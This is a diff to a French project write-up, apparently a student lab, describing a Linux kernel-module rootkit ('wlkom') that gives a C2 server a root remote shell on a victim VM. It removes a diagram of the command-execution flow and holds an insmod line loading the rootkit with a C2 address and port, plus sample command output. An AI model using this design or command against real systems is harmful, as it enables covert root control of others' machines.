@@ -535,21 +535,6 @@ sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
 La fonctionnalité permet d'exécuter n'importe quelle commande ou script shell sur la VM victime avec les privilèges `root` (espace noyau) et d'en encapsuler l'intégralité des flux vers l'attaquant.
 
 
-[ C2 Server ]             [ Rootkit (LKM) ]
-                       │                           │
-                 c2_shell> uname -a                │
-                       │ ───────( TCP socket )───> │
-                       │                           │ kernel_recvmsg()
-                       │                           │ execute_and_send_output()
-                       │                           │   └─ call_usermodehelper(UMH_WAIT_PROC)
-                       │                           │        └─ /bin/sh -c "uname -a > /tmp/.out 2>&1"
-                       │                           │
-                       │ <──────( Exit Status )─── │ send_reply("[Exit Status: 0]")
-                       │ <──────( stdout/stderr )─ │ kernel_read(/tmp/.wlkom_out) -> chunks
-                       │ <──────( End Marker )──── │ send_reply("--- End of Output ---")
-                       │                           │
-                 c2_shell> _                       │
-
 
 * **Attente synchrone du processus** : Le module utilise `call_usermodehelper` avec le flag `UMH_WAIT_PROC` pour bloquer le kthread jusqu'à la fin de la commande userland, assurant la capture complète des flux.
 
@@ -573,6 +558,7 @@ c2_shell> uname -a
 Linux epita-victim 6.1.0-48-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.172-1 (2026-05-15) x86_64 GNU/Linux
 
 --- End of Output ---
+```text
 
 ### Upload / Download (1.5pt + 1.5pt) — TODO
 
